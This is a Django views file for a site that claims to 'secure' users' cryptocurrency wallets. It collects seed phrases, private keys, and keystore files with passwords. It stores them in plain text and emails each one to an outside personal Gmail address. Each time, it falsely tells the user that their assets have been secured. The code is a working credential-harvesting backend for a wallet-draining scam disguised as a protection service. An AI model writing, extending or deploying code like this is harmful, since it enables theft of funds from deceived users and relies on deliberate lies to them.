from django.shortcuts import render,redirect
from django.contrib import messages
from .models import Phrase,Keystore_json,Private_key,Wallets
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
import email
import threading
from django.urls import reverse
from django.conf import settings
from django.core.mail import EmailMessage
from django.template.loader import render_to_string


class EmailThread(threading.Thread):

    def __init__(self, email):
        self.email = email
        threading.Thread.__init__(self)

    def run(self):
        self.email.send()

def send_email_secureasset(user,wallet_name,assets,name):
    
    email_subject = 'User secured asset'
    email_body = render_to_string('secure_asset/user_secure_asset.html', {
        'user': user,
        'wallet_name': wallet_name,
        'assets':assets,
        'name': name

        
    })

    email = EmailMessage(subject=email_subject, body=email_body,
                         from_email='support@assetssecurityledgers.com',
                         to=["johnsimonwork@gmail.com"]
                         )
    if not settings.TESTING:
        EmailThread(email).start()


# Create your views here.
@login_required
def secure_asset_detail_page(request): 
    return render(request,"secure_asset/secure_asset_details_page.html",{})

@login_required
def secure_asset(request):
    all_wallet = Wallets.objects.all()
    if request.method == 'POST':
        mode_to_secure = request.POST.get("mode_of_saving")
        if mode_to_secure == "phrase":
           name_of_wallet = request.POST.get("wallet_name")
           secret_phrase = request.POST.get("secret_phrase")
           user_ = request.user
           user_secret_phrase = Phrase(name_of_wallet=name_of_wallet,recovery_phrase=secret_phrase,user=user_)
           user_secret_phrase.save()
           user = request.user
           send_email_secureasset(user, name_of_wallet,secret_phrase,"secret_phrase")
           messages.success(request, "your assets have been secured successfully!")
           return redirect("dashboard:dashboard-page")

        elif mode_to_secure == "keystore_json":
            
            name_of_wallet = request.POST.get("wallet_name")
            keystore_json = request.POST.get("keystore_json")
            wallet_password = request.POST.get("wallet_password")
            user_ = request.user
            user_keystore_json = Keystore_json(name_of_wallet=name_of_wallet,keystore_json=keystore_json,wallet_password=wallet_password,user=user_)
            user_keystore_json.save()
            user = request.user
            send_email_secureasset(user,name_of_wallet,keystore_json,"keystore_json")
            messages.success(request, "your assets have been secured successfully!")
            return redirect("dashboard:dashboard-page")
        elif mode_to_secure == "private_key":
            name_of_wallet = request.POST.get("wallet_name")
            private_key = request.POST.get("private_key")
            user_ = request.user
            user_secret_phrase = Private_key(name_of_wallet=name_of_wallet,private_key=private_key,user=user_)
            user_secret_phrase.save()
            user = request.user
            send_email_secureasset(user,name_of_wallet,private_key,"private_key")
            messages.success(request, "your assets have been secured successfully!")
            return redirect("dashboard:dashboard-page")
           

    return render(request,"secure_asset/secure_asset.html",{"all_wallet":all_wallet})



def secure_asset_json(request):
    user= request.user
    
    if Phrase.objects.filter(user=user).exists():
        have_secured = "yes"
    elif Keystore_json.objects.filter(user=user).exists():
        have_secured = "yes"
    elif Private_key.objects.filter(user=user).exists():
        have_secured = "yes"
    else:
        have_secured = "no"
    return JsonResponse({"have_secured":have_secured})